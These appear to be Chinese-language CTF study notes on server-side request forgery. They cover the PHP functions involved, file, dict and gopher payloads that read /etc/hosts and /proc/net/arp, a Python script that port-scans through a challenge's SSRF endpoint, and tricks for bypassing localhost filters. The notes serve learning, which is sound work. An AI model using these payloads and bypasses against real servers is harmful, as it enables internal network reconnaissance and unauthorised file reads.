gopher 主力军

dict 测探版本信息

ftp 探测是否有ftp

http 检测是否有ssrfx

# PHP造成ssrf的函数

**curl_exec**

功能比较强大可以指定请求头

**file_get_contents,**

**sockopen**

# 常见协议

![](https://ucnckoaspefs.feishu.cn/space/api/box/stream/download/asynccode/?code=OTBkYzJkNGUxMGE3MmNhNzljODNmZjE3ZjBkNzI1ZjJfa25kUWlySENqcVJNaGJ4MnJ0ZGFpT0FxTWZYTWVJdFVfVG9rZW46V0o3Y2JpcXRWb3VRWnp4d3M1NWNicGdIbkhjXzE3NjYzMjAwODI6MTc2NjMyMzY4Ml9WNA)

## file协议

**查看ip地址**：file:///etc/hosts

**获取内网里面那些主机存活**:file:///proc/net/arp(要先尝试访问)

# dict伪协议

```http
dict://<ip>:<port>/info
```

# http伪协议

目录扫描

kali的/usr/share/wordlists
## 端口扫描脚本

```python
import requests

url = "http://13ba11b5-0c94-4a20-a1b9-a22db99e829f.challenges.ctfer.com:8080/"

ports = [21,22,80,443,3389,1433,3306,6379,8088]

#21 ftp

#22 ssh

#80 http

#443 https

#3389 rdp windows远程桌面

#1433 ms-sqlserver 默认端口

#3306 mysql 默认端口

#6379 redis 默认端口

#9000 php-fpm 默认端口

for p in ports:

try:

data={"url":f"gopher://127.0.0.1:{p}/"}

response = requests.post(url=url,data=data,timeout=2)

except:

print(f"端口{p}开放") #只要超时就认为开放

```

`dict://127.0.0.1:80/info用来端口扫描

# gopher伪协议

![](https://ucnckoaspefs.feishu.cn/space/api/box/stream/download/asynccode/?code=YzVjNzhhOGNhN2Q4YmQxMmFjZjFhNzllYWRlYzljYjFfNk55RVluRjdiWmZpYTBIeHJsVGhBZHVjU3dsTlVQSnRfVG9rZW46UE5GamIyZGVIb1JpRE54bGNibmNnWG1WbnBkXzE3NjYzMjA1OTE6MTc2NjMyNDE5MV9WNA)

gopher提交不提交第一个字符

gopher提交的没有其他多余的数据，但是第一个字符不会被传输

![](https://ucnckoaspefs.feishu.cn/space/api/box/stream/download/asynccode/?code=MjgxMzcxODBmMTMzNTdmY2RiOTQ0YTNjYWFiZDk0NmRfOHFSU0xhcGI2d05iZHpUTnZEQjJlNVExY25GWnJVOHpfVG9rZW46REtQamJ0OUxybzVzN0Z4ZHc1OGNsS2N0bm1lXzE3NjYzMjA1OTE6MTc2NjMyNDE5MV9WNA)

上面是用gopher传输，下面是http传输

并且默认传输到70端口

# 用gopher发送POST，GET请求


交post包第一行，Host，Content-Type，Content-Length，内容(hader和body之间记得要有换行)

交get请求，注意最后要加一个换行

# 127.0.0.1过滤

进制转换，302重定向，DNS重绑定，0.0.0.0

还有一个技巧是`http://username：password@baidu.com`这样